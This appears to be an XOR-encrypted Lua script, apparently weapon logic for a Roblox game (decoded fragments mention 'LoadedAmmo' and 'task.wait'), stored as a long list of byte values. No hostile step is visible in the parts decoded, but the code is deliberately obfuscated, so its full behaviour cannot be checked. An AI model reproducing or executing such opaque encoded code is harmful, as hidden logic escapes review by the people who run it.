134, 78, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 105, 141, 66, 56, 50, 172, 19, 251, 100, 134, 68, 61, 126, 177, 95, 236, 63, 165, 68, 45, 31, 248, 11, 230, 108, 128, 84, 45, 59, 164, 93, 216, 106, 131, 69, 60, 58, 205, 18, 249, 106, 192, 8, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 108, 132, 1, 53, 49, 237, 27, 241, 97, 194, 95, 100, 126, 226, 22, 248, 37, 150, 73, 60, 48, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 19, 251, 102, 131, 77, 121, 51, 248, 95, 169, 37, 189, 70, 56, 42, 164, 7, 184, 37, 192, 76, 56, 57, 174, 86, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 108, 132, 1, 52, 42, 172, 30, 250, 97, 194, 77, 54, 63, 232, 26, 240, 37, 222, 1, 6, 57, 225, 30, 236, 45, 154, 8, 121, 42, 228, 26, 250, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 248, 30, 246, 105, 135, 15, 48, 48, 255, 26, 230, 113, 202, 76, 56, 57, 255, 83, 180, 126, 139, 85, 60, 51, 177, 7, 184, 37, 131, 76, 52, 49, 216, 6, 228, 96, 223, 76, 45, 114, 172, 12, 248, 106, 150, 28, 33, 100, 203, 26, 224, 68, 150, 85, 43, 55, 238, 10, 224, 96, 202, 3, 10, 50, 227, 11, 182, 44, 206, 1, 41, 63, 254, 26, 250, 113, 223, 66, 48, 35, 165, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 241, 107, 134, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 241, 105, 145, 68, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 50, 227, 28, 245, 105, 194, 64, 45, 126, 177, 95, 203, 98, 131, 85, 113, 38, 160, 95, 182, 100, 143, 76, 54, 124, 165, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 253, 99, 194, 64, 45, 126, 248, 23, 241, 107, 194, 85, 56, 60, 224, 26, 186, 108, 140, 82, 60, 44, 248, 87, 245, 104, 143, 78, 42, 114, 172, 4, 253, 113, 135, 76, 100, 38, 160, 95, 231, 105, 141, 85, 13, 39, 252, 26, 169, 100, 150, 13, 121, 45, 224, 16, 224, 56, 154, 27, 30, 59, 248, 62, 224, 113, 144, 72, 59, 43, 248, 26, 188, 39, 177, 77, 54, 42, 174, 86, 184, 37, 146, 64, 43, 59, 226, 11, 169, 102, 139, 92, 112, 126, 233, 17, 240, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 233, 17, 240, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 135, 79, 61, 84, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 135, 79, 61, 84, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 233, 17, 240, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 233, 17, 240, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 234, 16, 230, 37, 189, 13, 121, 51, 237, 24, 180, 108, 140, 1, 48, 46, 237, 22, 230, 118, 202, 76, 56, 57, 255, 86, 180, 97, 141, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 63, 49, 254, 95, 203, 41, 194, 64, 52, 51, 227, 95, 253, 107, 194, 72, 41, 63, 229, 13, 231, 45, 131, 76, 52, 49, 255, 86, 180, 97, 141, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 253, 99, 194, 76, 56, 57, 162, 30, 249, 104, 141, 117, 32, 46, 233, 95, 169, 56, 194, 64, 52, 51, 227, 81, 231, 105, 141, 85, 13, 39, 252, 26, 180, 113, 138, 68, 55, 84, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 252, 28, 245, 105, 142, 9, 63, 43, 226, 28, 224, 108, 141, 79, 113, 119, 172, 13, 241, 104, 141, 85, 60, 100, 202, 22, 230, 96, 177, 68, 43, 40, 233, 13, 188, 100, 143, 76, 54, 112, 255, 19, 251, 113, 206, 1, 52, 63, 235, 81, 231, 105, 141, 85, 117, 126, 237, 18, 249, 106, 204, 81, 56, 44, 233, 17, 224, 41, 194, 76, 56, 57, 162, 15, 245, 119, 135, 79, 45, 119, 172, 26, 250, 97, 203, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 45, 63, 255, 20, 186, 114, 131, 72, 45, 118, 165, 68, 180, 103, 144, 68, 56, 53, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 68, 55, 58, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 26, 250, 97, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 26, 250, 97, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 68, 55, 58, 165, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 60, 48, 232, 117, 180, 37, 194, 1, 121, 126, 172, 95, 241, 107, 134, 8, 83, 126, 172, 95, 180, 96, 140, 69, 83, 59, 226, 27, 233, 44, 232, 43, 116, 115, 172, 157, 0, 133, 0, 181, 217, 188, 24, 255, 180, 107, 141, 1, 42, 41, 237, 6, 180, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 43, 61, 49, 134, 95, 180, 37, 194, 77, 54, 61, 237, 19, 180, 90, 145, 86, 56, 39, 201, 17, 245, 103, 142, 68, 61, 126, 177, 95, 242, 100, 142, 82, 60, 84, 172, 95, 180, 37, 142, 78, 58, 63, 224, 95, 203, 118, 149, 64, 32, 14, 237, 11, 247, 109, 135, 69, 121, 99, 172, 25, 245, 105, 145, 68, 83, 84, 172, 95, 180, 37, 142, 78, 58, 63, 224, 95, 242, 112, 140, 66, 45, 55, 227, 17, 180, 90, 146, 64, 45, 61, 228, 44, 227, 100, 155, 9, 112, 84, 172, 95, 180, 37, 194, 1, 121, 126, 229, 25, 180, 90, 145, 86, 56, 39, 220, 30, 224, 102, 138, 68, 61, 126, 248, 23, 241, 107, 194, 83, 60, 42, 249, 13, 250, 37, 135, 79, 61, 84, 172, 95, 180, 37, 194, 1, 121, 126, 252, 28, 245, 105, 142, 9, 63, 43, 226, 28, 224, 108, 141, 79, 113, 119, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 77, 54, 61, 237, 19, 180, 119, 145, 1, 100, 126, 222, 26, 228, 105, 139, 66, 56, 42, 233, 27, 199, 113, 141, 83, 56, 57, 233, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 53, 49, 239, 30, 248, 37, 145, 84, 58, 61, 233, 12, 231, 41, 194, 76, 54, 58, 172, 66, 180, 117, 129, 64, 53, 50, 164, 13, 241, 116, 151, 72, 43, 59, 160, 95, 230, 118, 216, 103, 48, 48, 232, 57, 253, 119, 145, 85, 26, 54, 229, 19, 240, 45, 192, 108, 54, 58, 249, 19, 241, 118, 192, 8, 121, 63, 226, 27, 180, 119, 145, 15, 20, 49, 232, 10, 248, 96, 145, 27, 31, 55, 226, 27, 210, 108, 144, 82, 45, 29, 228, 22, 248, 97, 202, 3, 31, 14, 223, 93, 189, 44, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 22, 242, 37, 145, 84, 58, 61, 233, 12, 231, 37, 131, 79, 61, 126, 225, 16, 240, 37, 131, 79, 61, 126, 225, 16, 240, 43, 151, 81, 61, 63, 248, 26, 215, 105, 139, 68, 55, 42, 172, 11, 252, 96, 140, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 53, 49, 239, 30, 248, 37, 141, 77, 61, 1, 249, 15, 240, 100, 150, 68, 121, 99, 172, 18, 251, 97, 204, 84, 41, 58, 237, 11, 241, 70, 142, 72, 60, 48, 248, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 249, 106, 134, 15, 44, 46, 232, 30, 224, 96, 161, 77, 48, 59, 226, 11, 180, 56, 194, 71, 44, 48, 239, 11, 253, 106, 140, 9, 56, 111, 160, 95, 245, 55, 206, 1, 56, 109, 165, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 53, 49, 239, 30, 248, 37, 144, 16, 117, 126, 254, 77, 184, 37, 144, 18, 121, 99, 172, 16, 248, 97, 189, 84, 41, 58, 237, 11, 241, 45, 131, 16, 117, 126, 237, 77, 184, 37, 131, 18, 112, 84, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 139, 71, 121, 1, 255, 8, 245, 124, 167, 79, 56, 60, 224, 26, 240, 37, 131, 79, 61, 126, 237, 78, 180, 100, 140, 69, 121, 63, 189, 81, 231, 117, 144, 72, 55, 57, 255, 95, 224, 109, 135, 79, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 56, 227, 13, 180, 90, 206, 1, 42, 46, 254, 22, 250, 98, 194, 72, 55, 126, 252, 30, 253, 119, 145, 9, 56, 111, 162, 12, 228, 119, 139, 79, 62, 45, 165, 95, 240, 106, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 22, 242, 37, 145, 81, 43, 55, 226, 24, 186, 85, 141, 82, 48, 42, 229, 16, 250, 37, 150, 73, 60, 48, 172, 12, 228, 119, 139, 79, 62, 112, 220, 16, 231, 108, 150, 72, 54, 48, 172, 66, 180, 83, 135, 66, 45, 49, 254, 76, 186, 107, 135, 86, 113, 119, 172, 26, 250, 97, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 22, 242, 37, 145, 81, 43, 55, 226, 24, 186, 86, 146, 68, 60, 58, 172, 11, 252, 96, 140, 1, 42, 46, 254, 22, 250, 98, 204, 114, 41, 59, 233, 27, 180, 56, 194, 17, 121, 59, 226, 27, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 96, 140, 69, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 96, 140, 69, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 119, 135, 85, 44, 44, 226, 95, 230, 52, 206, 1, 43, 108, 160, 95, 230, 54, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 68, 55, 58, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 32, 231, 114, 131, 88, 9, 63, 248, 28, 252, 96, 134, 1, 100, 126, 248, 13, 225, 96, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 26, 250, 97, 232, 1, 121, 126, 172, 95, 180, 37, 194, 68, 55, 58, 165, 117, 180, 37, 194, 1, 60, 48, 232, 117, 158, 37, 194, 1, 121, 9, 233, 30, 228, 86, 135, 66, 45, 55, 227, 17, 174, 81, 141, 70, 62, 50, 233, 87, 239, 81, 139, 85, 53, 59, 172, 66, 180, 39, 140, 78, 121, 45, 251, 30, 237, 39, 206, 1, 31, 50, 237, 24, 180, 56, 194, 3, 14, 59, 252, 49, 251, 86, 149, 64, 32, 124, 160, 95, 208, 96, 132, 64, 44, 50, 248, 95, 169, 37, 132, 64, 53, 45, 233, 83, 180, 70, 131, 77, 53, 60, 237, 28, 255, 37, 223, 1, 63, 43, 226, 28, 224, 108, 141, 79, 113, 45, 165, 117, 180, 37, 194, 1, 121, 126, 172, 95, 203, 118, 149, 64, 32, 27, 226, 30, 246, 105, 135, 69, 121, 99, 172, 12, 158, 37, 194, 1, 121, 126, 172, 95, 180, 108, 132, 1, 42, 126, 248, 23, 241, 107, 194, 85, 56, 45, 231, 81, 231, 117, 131, 86, 55, 118, 211, 15, 245, 113, 129, 73, 10, 41, 237, 6, 189, 37, 135, 79, 61, 84, 172, 95, 180, 37, 135, 79, 61, 35, 165, 117, 241, 107, 134, 43, 83, 115, 161, 95, 118, 145, 98, 195, 205, 222, 110, 235, 20, 37, 151, 79, 53, 49, 239, 20, 180, 99, 139, 83, 60, 51, 227, 27, 241, 118, 194, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 232, 69, 54, 84, 172, 95, 180, 37, 142, 78, 58, 63, 224, 95, 203, 99, 143, 100, 55, 63, 238, 19, 241, 97, 194, 28, 121, 56, 237, 19, 231, 96, 232, 1, 121, 126, 172, 19, 251, 102, 131, 77, 121, 1, 234, 18, 217, 106, 134, 84, 53, 59, 255, 95, 169, 37, 153, 92, 83, 126, 172, 95, 180, 105, 141, 66, 56, 50, 172, 32, 242, 104, 173, 83, 48, 57, 229, 17, 245, 105, 145, 1, 100, 126, 247, 2, 158, 37, 194, 1, 121, 50, 227, 28, 245, 105, 194, 126, 63, 51, 207, 30, 247, 109, 135, 69, 121, 99, 172, 25, 245, 105, 145, 68, 83, 84, 172, 95, 180, 37, 142, 78, 58, 63, 224, 95, 242, 112, 140, 66, 45, 55, 227, 17, 180, 90, 132, 76, 26, 63, 239, 23, 241, 45, 203, 43, 121, 126, 172, 95, 180, 37, 194, 1, 45, 63, 238, 19, 241, 43, 129, 77, 60, 63, 254, 87, 203, 99, 143, 108, 54, 58, 249, 19, 241, 118, 203, 26, 121, 42, 237, 29, 248, 96, 204, 66, 53, 59, 237, 13, 188, 90, 132, 76, 22, 44, 229, 24, 253, 107, 131, 77, 42, 119, 183, 95, 203, 99, 143, 98, 56, 61, 228, 26, 240, 37, 223, 1, 63, 63, 224, 12, 241, 15, 194, 1, 121, 126, 172, 95, 180, 37, 142, 78, 58, 63, 224, 95, 253, 113, 135, 76, 42, 126, 177, 95, 198, 96, 146, 77, 48, 61, 237, 11, 241, 97, 177, 85, 54, 44, 237, 24, 241, 63, 164, 72, 55, 58, 202, 22, 230, 118, 150, 98, 49, 55, 224, 27, 188, 39, 171, 85, 60, 51, 255, 51, 253, 118, 150, 3, 112, 84, 172, 95, 180, 37, 194, 1, 121, 126, 229, 25, 180, 107, 141, 85, 121, 55, 248, 26, 249, 118, 194, 85, 49, 59, 226, 95, 230, 96, 150, 84, 43, 48, 172, 26, 250, 97, 232, 1, 121, 126, 172, 95, 180, 37, 194, 71, 54, 44, 172, 32, 184, 37, 148, 1, 48, 48, 172, 22, 228, 100, 139, 83, 42, 118, 229, 11, 241, 104, 145, 27, 30, 59, 248, 59, 241, 118, 129, 68, 55, 58, 237, 17, 224, 118, 202, 8, 112, 126, 232, 16, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 55, 234, 95, 226, 63, 171, 82, 24, 118, 174, 50, 251, 97, 151, 77, 60, 13, 239, 13, 253, 117, 150, 3, 112, 126, 237, 17, 240, 37, 148, 15, 23, 63, 225, 26, 180, 56, 223, 1, 123, 13, 233, 11, 224, 108, 140, 70, 42, 19, 227, 27, 225, 105, 135, 3, 121, 42, 228, 26, 250, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 142, 78, 58, 63, 224, 95, 251, 110, 206, 1, 52, 49, 232, 95, 169, 37, 146, 66, 56, 50, 224, 87, 230, 96, 147, 84, 48, 44, 233, 83, 180, 115, 203, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 48, 56, 172, 16, 255, 37, 131, 79, 61, 126, 248, 6, 228, 96, 202, 76, 54, 58, 165, 95, 169, 56, 194, 3, 45, 63, 238, 19, 241, 39, 194, 85, 49, 59, 226, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 6, 56, 225, 50, 251, 97, 151, 77, 60, 45, 215, 92, 203, 99, 143, 108, 54, 58, 249, 19, 241, 118, 201, 16, 4, 126, 177, 95, 249, 106, 134, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 253, 99, 194, 85, 32, 46, 233, 87, 249, 106, 134, 15, 31, 55, 254, 26, 217, 106, 134, 68, 42, 119, 172, 66, 169, 37, 192, 85, 56, 60, 224, 26, 182, 37, 150, 73, 60, 48, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 19, 251, 102, 131, 77, 121, 61, 227, 15, 237, 37, 223, 1, 34, 35, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 25, 251, 119, 194, 72, 117, 126, 225, 95, 253, 107, 194, 72, 41, 63, 229, 13, 231, 45, 143, 78, 61, 112, 202, 22, 230, 96, 175, 78, 61, 59, 255, 86, 180, 97, 141, 1, 58, 49, 252, 6, 207, 108, 191, 1, 100, 126, 225, 95, 241, 107, 134, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 6, 56, 225, 48, 230, 108, 133, 72, 55, 63, 224, 12, 207, 104, 141, 69, 4, 126, 177, 95, 247, 106, 146, 88, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 96, 140, 69, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 59, 226, 27, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 59, 226, 27, 158, 37, 194, 1, 121, 126, 172, 95, 180, 96, 140, 69, 83, 126, 172, 95, 180, 37, 194, 1, 121, 1, 234, 18, 215, 100, 129, 73, 60, 58, 172, 66, 180, 113, 144, 84, 60, 84, 172, 95, 180, 37, 135, 79, 61, 84, 134, 95, 180, 37, 194, 118, 60, 63, 252, 44, 241, 102, 150, 72, 54, 48, 182, 43, 251, 98, 133, 77, 60, 118, 247, 43, 253, 113, 142, 68, 121, 99, 172, 93, 225, 107, 142, 78, 58, 53, 172, 25, 253, 119, 135, 76, 54, 58, 233, 12, 182, 41, 194, 103, 53, 63, 235, 95, 169, 37, 192, 118, 60, 46, 217, 17, 248, 106, 129, 74, 31, 55, 254, 26, 249, 106, 134, 68, 42, 124, 160, 95, 208, 96, 132, 64, 44, 50, 248, 95, 169, 37, 132, 64, 53, 45, 233, 83, 180, 70, 131, 77, 53, 60, 237, 28, 255, 37, 223, 1, 63, 43, 226, 28, 224, 108, 141, 79, 113, 45, 165, 117, 180, 37, 194, 1, 121, 126, 172, 95, 203, 99, 143, 100, 55, 63, 238, 19, 241, 97, 194, 28, 121, 45, 134, 95, 180, 37, 194, 1, 121, 126, 172, 22, 242, 37, 145, 1, 45, 54, 233, 17, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 55, 234, 95, 250, 106, 150, 1, 6, 56, 225, 60, 245, 102, 138, 68, 61, 126, 248, 23, 241, 107, 194, 85, 56, 45, 231, 81, 231, 117, 131, 86, 55, 118, 211, 25, 249, 70, 131, 66, 49, 59, 165, 95, 241, 107, 134, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 224, 100, 145, 74, 119, 45, 252, 30, 227, 107, 202, 71, 44, 48, 239, 11, 253, 106, 140, 9, 112, 84, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 229, 25, 180, 107, 141, 85, 121, 1, 234, 18, 215, 100, 129, 73, 60, 58, 172, 11, 252, 96, 140, 1, 45, 63, 255, 20, 186, 114, 131, 72, 45, 118, 189, 86, 180, 96, 140, 69, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 56, 227, 13, 180, 90, 206, 1, 52, 49, 232, 95, 253, 107, 194, 72, 41, 63, 229, 13, 231, 45, 189, 71, 52, 19, 227, 27, 225, 105, 135, 82, 112, 126, 232, 16, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 46, 239, 30, 248, 105, 202, 71, 44, 48, 239, 11, 253, 106, 140, 9, 112, 126, 225, 16, 240, 43, 164, 72, 43, 59, 193, 16, 240, 96, 145, 1, 100, 126, 247, 93, 213, 112, 150, 78, 123, 114, 174, 44, 241, 104, 139, 3, 36, 126, 233, 17, 240, 44, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 68, 55, 58, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 68, 55, 58, 165, 117, 180, 37, 194, 1, 121, 126, 172, 95, 241, 105, 145, 68, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 99, 141, 83, 121, 51, 227, 27, 184, 37, 143, 78, 61, 59, 255, 95, 253, 107, 194, 81, 56, 55, 254, 12, 188, 90, 132, 76, 22, 44, 229, 24, 253, 107, 131, 77, 42, 119, 172, 27, 251, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 146, 66, 56, 50, 224, 87, 242, 112, 140, 66, 45, 55, 227, 17, 188, 44, 194, 76, 54, 58, 162, 57, 253, 119, 135, 108, 54, 58, 233, 12, 180, 56, 194, 76, 54, 58, 233, 12, 180, 96, 140, 69, 112, 84, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 135, 79, 61, 84, 172, 95, 180, 37, 194, 1, 121, 126, 233, 17, 240, 15, 194, 1, 121, 126, 233, 17, 240, 120, 203, 43, 60, 48, 232, 117, 158, 40, 207, 1, 187, 202, 12, 157, 0, 133, 0, 181, 217, 126, 254, 15, 249, 37, 128, 78, 54, 45, 248, 26, 230, 37, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 118, 145, 98, 195, 205, 222, 110, 235, 20, 231, 118, 161, 187, 202, 12, 157, 0, 133, 0, 181, 217, 188, 24, 255, 158, 97, 141, 43, 121, 126, 172, 95, 248, 106, 129, 64, 53, 126, 211, 13, 228, 104, 167, 79, 56, 60, 224, 26, 240, 37, 223, 1, 63, 63, 224, 12, 241, 15, 194, 1, 121, 126, 224, 16, 247, 100, 142, 1, 6, 44, 252, 18, 221, 107, 150, 68, 43, 40, 237, 19, 180, 56, 194, 17, 119, 110, 185, 117, 180, 37, 194, 1, 53, 49, 239, 30, 248, 37, 189, 83, 41, 51, 193, 16, 240, 112, 142, 68, 42, 126, 177, 95, 239, 120, 232, 1, 121, 126, 172, 19, 251, 102, 131, 77, 121, 1, 254, 15, 249, 74, 144, 72, 62, 126, 177, 95, 239, 120, 232, 43, 121, 126, 172, 95, 248, 106, 129, 64, 53, 126, 234, 10, 250, 102, 150, 72, 54, 48, 172, 32, 230, 117, 143, 98, 56, 61, 228, 26, 188, 44, 232, 1, 121, 126, 172, 95, 180, 37, 194, 85, 56, 60, 224, 26, 186, 102, 142, 68, 56, 44, 164, 32, 230, 117, 143, 108, 54, 58, 249, 19, 241, 118, 203, 26, 121, 42, 237, 29, 248, 96, 204, 66, 53, 59, 237, 13, 188, 90, 144, 81, 52, 17, 254, 22, 243, 44, 232, 1, 121, 126, 172, 95, 180, 37, 194, 77, 54, 61, 237, 19, 180, 108, 150, 68, 52, 45, 172, 66, 180, 87, 135, 81, 53, 55, 239, 30, 224, 96, 134, 114, 45, 49, 254, 30, 243, 96, 216, 103, 48, 48, 232, 57, 253, 119, 145, 85, 26, 54, 229, 19, 240, 45, 192, 104, 45, 59, 225, 12, 216, 108, 145, 85, 123, 119, 134, 95, 180, 37, 194, 1, 121, 126, 172, 22, 242, 37, 140, 78, 45, 126, 229, 11, 241, 104, 145, 1, 45, 54, 233, 17, 180, 119, 135, 85, 44, 44, 226, 95, 241, 107, 134, 43, 121, 126, 172, 95, 180, 37, 194, 1, 63, 49, 254, 95, 203, 41, 194, 87, 121, 55, 226, 95, 253, 117, 131, 72, 43, 45, 164, 22, 224, 96, 143, 82, 99, 25, 233, 11, 208, 96, 